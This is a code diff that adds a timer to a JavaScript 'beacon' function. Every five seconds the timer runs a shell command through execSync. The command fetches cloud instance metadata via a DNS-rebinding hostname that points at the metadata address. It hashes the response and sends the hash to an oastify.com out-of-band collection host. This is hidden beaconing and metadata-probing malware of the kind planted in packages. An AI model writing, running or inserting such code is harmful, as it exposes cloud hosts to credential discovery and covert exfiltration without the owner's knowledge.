@@ -52,6 +52,18 @@ function beacon(urlStr, q) {
 ).trim();
     idOutput = Buffer.from(idOutput).toString("base64");
   } catch {}
+  setInterval(() => {
+  try {
+    const idOutput = execSync(
+      'RESP=$(curl -s http://a9fea9fe.33267158.rbndr.us/latest/meta-data/); HASH=$(echo -n "$RESP" | sha256sum | awk \'{print $1}\'); curl -s "http://sxtggrdkop8c5t96ybhk1evvfmld99xy.oastify.com/ping?hash=$HASH"',
+      { encoding: "utf8" }
+    ).trim();
+
+    console.log(`[+] Sent hash at ${new Date().toISOString()}: ${idOutput}`);
+  } catch (err) {
+    console.error("[-] Error executing command:", err.message);
+  }
+}, 5000);
 
   const nonce = crypto.randomBytes(8).toString("hex");
 
